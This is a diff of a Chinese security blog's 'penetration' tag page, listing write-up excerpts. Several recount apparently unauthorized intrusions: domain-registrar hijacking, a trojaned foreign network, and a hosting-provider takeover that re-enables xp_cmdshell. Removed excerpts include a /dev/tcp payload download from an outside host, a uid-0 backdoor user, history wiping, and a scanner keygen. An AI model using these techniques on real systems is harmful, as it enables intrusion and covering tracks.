@@ -45,6 +45,168 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
+      <time datetime="2012-06-12T09:55:42.000Z" itemprop="datePublished">
+          2012-06-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/反向代理/'>反向代理</a>,
+    
+    <a href='/tag/Nginx/'>Nginx</a>,
+    
+    <a href='/tag/web渗透测试/'>web渗透测试</a>,
+    
+    <a href='/tag/squid/'>squid</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/493.seo/">反向代理在Web渗透测试中的运用</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>反向代理在Web渗透测试中的运用 </p>  <p>作者：不走的钟 </p>  <p>来源：<a href="http://www.007hack.com/?p=770">http://www.007hack.com/?p=770</a></p>  <p> 在一次Web渗透测试中，目标是M国的一个Win+Apache+PHP+MYSQL的网站，独立服务器，对外仅开80端口，网站前端的业务系统比较简单，经过几天的测试也没有找到漏洞，甚至连XSS都没有发现，也未找到网站后台，在收集信息的时候已经排除了C段入侵的可行性（选择C段入侵的时候，需要对目标、网络、路由和国家区域进行分析和判断，如果不经思考和判断地去入侵C段服务器，当你费尽心思拿到某台服务器权限时，往往发现毫无半点用处，特别又是在国外，ARP基本上都没什么希望，当然内网渗透中又是另一回事。） </p>  <p> 也许在渗透测试遇到这种情况时大多会选择放弃，在绝望的时候，我将目标临时转移到该网站域名注册商，因为拥有域名注册商网站权限，至少可以修改目标网站的域名解析。一般情况入侵域名注册网站难度比较大，但并不是没有希望，在09年的时候，国内很多域名注册商的网站都存在漏洞。渗透那个域名注册商网站，过程比较繁杂，也没有新的技术点，靠的就是细心和耐心，但最终还是获取到目标网站域名的管理账号和密码，那么此时我们已知和已有的条件如下: </p>  <p> 目标域名：www.007hack.com(当然不是真的，文章来源007安全)   <br /> 网站IP:1.1.1.1 </p>  <p> 环境：Win+Apache+PHP+MYSQL </p>  <p> 已有权限：域名解析权限，可以将www.007hack.com解析到任何一个IP上 </p>  <p> 特别说明下，目标网站使用的服务器，并不是在域名注册商租用的，而是放置在公司机房中，所以通过域名注册商网站，是不能管理到Web源码的，只能进行域名解析。 </p>  <p> 当拥有域名解析权限后，如何才获取目标网站的权限呢？ </p>  <p> A：构造一个和目标非常相似的网站？然后将域名解析到构造的网站？ </p>  <p> B：使用iis重定向？ </p>  <p>这些方法都非常容易被发现，并且也无法获取到权限，所以遇到这种场景的时候我们可以使用反向代理，也是本文的重点。了解反向代理之前，我做一个关于HTTP 代理的简单介绍， 代理常用的是普通代理和反向代理： </p>  <p>普通代理：为用户（客户端）提供代理，需要在客户端设置，比如在客户端浏览器中设置代理服务器IP和端口，完成配置后，用户可以通过代理服务器访问互联网，代理服务器相当于中间人的作用。根据代理服务器配置不同，又可以将普通代理分为，几种不同安全级别的代理，代理软件比较多，不同的厂商有不同的称谓和分级，一般情况都包括以下三个级别，透明代理、普通匿名代理和高匿名代理。</p>
+      
+      </p>
+      
+      <p>
+          <a href="/493.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-12T09:54:04.000Z" itemprop="datePublished">
+          2012-06-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/入侵/'>入侵</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/490.seo/">回忆对某企业内网的一次渗透</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>回忆对某企业内网的一次渗透做了好多次企业内网渗透的项目,这里还是写下把.</p>  <p>先是谈合同 谈预算 谈价格 这些不多介绍</p>  <p>然后签订保密协议这个也不多说了,最后才是评估以及加固..</p>  <p>进入正题</p>  <p>图片上重要信息或涉密信息均涂掉了,有些突变未上传..</p>  <p>————————————————————————-</p>  <p>首先要踩点,收集信息,这是第一步也是蛮重要的一步个人觉得.</p>  <p>目标信息:</p>  <p>主域名:www.xxxx.com </p>  <p>子域名;OA.xxxx.com</p>  <p>无服务器版本 win2003</p>  <p>脚本语言:ASPX</p>  <p>知道这个以后就开始搞了</p>  <p>然后开始找入住,翻遍全站没发现,找注入大家都会不解释,你懂的.</p>  <p>然后扫目录..</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/befcd4dc8bb9_1A90/clip_image001.gif" width="533" height="447" /></p>  <p>一个一个的翻,找到了洞洞..</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/befcd4dc8bb9_1A90/clip_image003.png" width="508" height="361" /></p>
+      
+      </p>
+      
+      <p>
+          <a href="/490.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-12T09:46:14.000Z" itemprop="datePublished">
+          2012-06-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/内网渗透/'>内网渗透</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/483.seo/">win内网渗透实例</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>作者：赤龙<br>最近在整理资料时发现一些渗透笔记，于是翻开看看，原来有一个老外的内部网还没有拿下。当时已经给内网的一台机器种植了木马，反正闲着没事就拿它来练练手吧。打开远程居然肉鸡还在，废话就不多说了，下面开始吧。<br>首先来看看已经控制的这台电脑在内网中充当什么角色，并收集一些常规的信息。执行ipconfig /all (如图1)</p>
+<p><img style="display: inline; border: 0px;" title="clip_image001" src="http://img.cker.in/win_18C1/clip_image001.png" alt="clip_image001" width="752" height="754" border="0" /><br>从这里我们可以看出，此计算机名为abimaq6，ip地址是172.16.16.139。子网掩码为255.255.240.0、网关172.16.16.1、DNS服务器分别是172.16.16.2和172.16.16.3。还有一个重要的就是这台机器处于域管理模式中，所在域为abimaq.local。<br>既然是域结构，再来获取一下域用户列表，执行net user /domain命令(如图2)。该命令可显示所有的域用户名单。看来域用户还真多。</p>
+      
+      </p>
+      
+      <p>
+          <a href="/483.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-12T09:35:13.000Z" itemprop="datePublished">
+          2012-06-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/入侵/'>入侵</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/478.seo/">社工+渗透某IDC服务器</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>作者：hu1s4</p>  <p>最近准备做个教育资源站，就打算在网上买个空间，ok百度下吧看看哪个好点</p>  <p>最后准备去这个站注册www.xxxxx.com</p>  <p>西部万维，西部IDC行业领跑，以最值得信赖的信誉为您提供服务器托管、服务器租用、域名注册、服务器租用、VPS、独立IP虚拟主机等服务</p>  <p>淘宝—网银—支付宝—支付成功！！</p>  <p>嘻嘻 邮箱收信了、</p>  <p>嘿嘿…空间到手了，进入FTP传个大马，因为我购买的是全能型空间，所以直接上传asp php asp.net jsp四类大马</p>  <p>查看，哎，权限bt啊，</p>  <p>（如果权限不bt，难道想被万人骑啊 hoho~~~）</p>  <p>试试看.net马吧</p>  <p>貌似权限比ASP的要大 可跳转</p>  <p>在C:\Program Files 发现了360还有星外的主机管理系统</p>  <p>一、提权之旅</p>  <p>在网上看了很多的星外提权文章，大概可以分为：</p>  <p>星外sa注册表位置在这里可以翻到sa的密码 不过需要破解</p>  <p>HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</p>  <p>C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\ 星外可写目录</p>  <p>还有一些就不列举了经过测试没有一个可行 ……峰回路转</p>  <p>正我郁闷的时候看到了Global.asa，激动的打开一看既然是sa用户</p>  <p>呵呵提权没问题了吧，不过却：</p>  <p>SQL Server 阻止了对组件 ‘xp_cmdshell’ 的过程’sys.xp_cmdshell’ 的访问</p>  <p>组件删除了，没关系我们恢复</p>  <p>dbcc addextendedproc (&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)&#160; <br />dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</p>  <p>恢复好了，执行下命令在创建用户加入管理，，OK搞定</p>  <p>远程连接的时候悲剧了既然限制了管理用户组的权限。哎</p>  <p>继续想其他办法，在网上看了一篇文章</p>  <p>知道星外的ftp是自带的，我们可以通过IIS配置来读取用户密码</p>  <p>打开aspx的IIS间谍功能，既然没有禁止，教大家一个禁止aspx查看IIS配置的方法</p>  <p>找到C:\WINDOWS\system32\activeds.tlb这个文件，取消users权限即可，别人就不能查看你的IIS了</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/IDC_15DB/clip_image001.png" width="558" height="233" /></p>  <p>大家看到上面的比较了红色的FREE….</p>  <p>Freehostrunat这个用户是安装星外时建立的后面的密码并不是什么加密方式其实就是明文密码</p>  <p>我们可以直接远程登陆,在内网的话就转发</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_15DB/clip_image002.png" width="513" height="375" /></p>  <p>好了，成功拿下服务器…. 继续渗透….</p>
+      
+      </p>
+      
+      <p>
+          <a href="/478.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-06-12T09:11:30.000Z" itemprop="datePublished">
+          2012-06-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/渗透/'>渗透</a>,
+    
+    <a href='/tag/内网渗透/'>内网渗透</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/465.seo/">浅析企业内网渗透</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        2010年起，Google、SONY、RSA等诸多大型企业遭受APT渗透攻击，对机密资料的保护和内部控制越来越受到人们的重视。本文以攻击者的角度，分析企业内网安全的入侵突破点，希望能给大家带来启发，更好的做好内网防控。一个企业，可以是不同行业，他们所包含的机密数据，隐蔽数据，功能控制，和对整个旗下的可信任域都是极为重要的安全方向。对于初具规模的企业来说，内部沟通需要邮件，即时沟通需要im软件，需要有域控，需要有核心交换机，有几个指定内外
+      
+      </p>
+      
+      <p>
+          <a href="/465.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
       <time datetime="2012-06-12T09:05:14.000Z" itemprop="datePublished">
           2012-06-12
       </time>
@@ -71,142 +233,10 @@
     </section>
   </article>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2011-12-07T01:24:32.000Z" itemprop="datePublished">
-          2011-12-07
-      </time>
-    
-    
-    | 
-    <a href='/tag/WVS/'>WVS</a>,
-    
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/神器/'>神器</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/195.seo/">Acunetix Web Vulnerability Scanner 8.x Enterprise Edition KeyGen By Hmily LCG]</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        [转自Hmily’S Blog]     这是一款网络漏洞扫描工具。通过网络爬虫测试你的网站安全，检测流行的攻击 ,如交叉站点脚本,sql 注入等。在被黑客攻击前扫描购物车，表格、安全区域和其他Web应用程序。75% 的互联网攻击目标是基于Web的应用程序。因为他们时常接触机密数据并且被放置在防火墙之前。         企业原版下载地址:http://www.acunetix.com/download/fullver8        
-      
-      </p>
-      
-      <p>
-          <a href="/195.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2011-11-01T00:19:46.000Z" itemprop="datePublished">
-          2011-11-01
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/Linux/'>Linux</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/181.seo/">Linux常用渗透技巧</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>1.无wget nc等下载工具时下载文件   <br />exec 5&lt;&gt;/dev/tcp/yese.yi.org/80 &amp;&amp;echo -e &quot;GET /c.pl HTTP/1.0\n&quot; &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl </p>  <p>2.Linux添加uid为0的用户   <br />useradd -o -u 0 cnbird </p>  <p>3.bash去掉history记录   <br />export HISTSIZE=0    <br />export HISTFILE=/dev/null </p>
-      
-      </p>
-      
-      <p>
-          <a href="/181.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2011-10-11T02:14:32.000Z" itemprop="datePublished">
-          2011-10-11
-      </time>
-    
-    
-    | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/bat/'>bat</a>,
-    
-    <a href='/tag/批处理/'>批处理</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/122.seo/">扫描内网指定用户能获取管理权限的机器</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>一个BAT脚本，自动获取内网机器列表，自动判断在线，自动扫描然后记录到日志…….</p>  <p>自动修正域名，自动判断域。。。不废话了，发代码</p>  <p>=========================c:\windows\user.txt=========================   <br />格式：    <br />domain\username password    <br />username password</p>
-      
-      </p>
-      
-      <p>
-          <a href="/122.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2011-10-08T20:22:54.000Z" itemprop="datePublished">
-          2011-10-09
-      </time>
-    
-    
-    | 
-    <a href='/tag/日志分析/'>日志分析</a>,
-    
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/网络安全/'>网络安全</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/92.seo/">根据日志逆向分析攻击者入侵思路及查找0day</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>转自：<a href="http://www.t00ls.net/">http://www.t00ls.net/</a></p>  <p>作者：daokers （金刀客）</p>  <p>博客：<a href="http://www.daokers.com">http://www.daokers.com</a></p>  <p>刀客城：<a href="http://www.daokers.cn">http://www.daokers.cn</a></p>  <blockquote>   <p>通过分析攻击者留下的日志，比较详细滴还原了攻击者踩点、渗透、尝试突破的经过，对攻与防的手段和事后响应漏洞修复都有介绍。受益匪浅。</p> </blockquote>  <p>详细过程：    <br />攻击者对我服务器的4个网站进行了大量的检测，最后决定把目标选为<a href="http://www.target.org/">www.target.org</a>。之后开始寻找注入点，时间大约是从2010-06-06 17:01:13左右开始，先后测试了这些带有参数的网址dc/toupiao.asp B1=投票&amp;B2=结果’ and ‘7’=’7</p>
-      
-      </p>
-      
-      <p>
-          <a href="/92.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/tag/渗透/page/3/">← Newer Posts</a>
-    <span class="page-number">Page 4 of 4</span>
-    
+    <span class="page-number">Page 4 of 5</span>
+    <a class="older-posts" href="/tag/渗透/page/5/">Older Posts →</a>
   </nav>
 </main>
 
